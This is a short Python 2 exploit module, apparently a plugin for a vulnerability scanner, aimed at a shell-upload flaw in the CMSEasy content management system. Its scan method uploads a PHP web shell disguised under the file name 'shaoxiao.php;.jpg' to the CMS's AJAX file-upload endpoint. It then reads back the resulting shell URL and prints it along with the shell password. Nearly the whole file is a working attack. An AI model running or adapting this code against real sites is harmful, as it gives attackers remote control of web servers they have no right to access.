#! /usr/bin/env python
#coding=utf-8

import modules.UPLOAD
import urllib2
import re

#############################易通cms上传shell漏洞###########################
#参考http://www.shack2.org/article/168.html
class cmseasyuploadshell:
    support = '[CMSEASY]'
    
    def isSupport(self,servie):
        if servie in self.support:
            return True
        else:
            return False
        
    def scan(self,arg,servie):
        if not self.isSupport(servie):
            return None
        try:
            opener = urllib2.build_opener(UPLOAD.MultipartPostHandler)
            params = {"fileToUpload" : open("shaoxiao.php;.jpg","rb")}
            url = arg.strip()+'/celive/live/doajaxfileupload.php'
            req = opener.open(url,params)
            html = req.read()
            murl = re.compile("<a href='(.*?)'")
            ok = murl.findall(html)
            if ok and '.php;.jpg' in ok[0]:
                print 'Shell:'+ok[0]+'  '+'pass:cun'
        except Exception,e:
            print e
            pass    
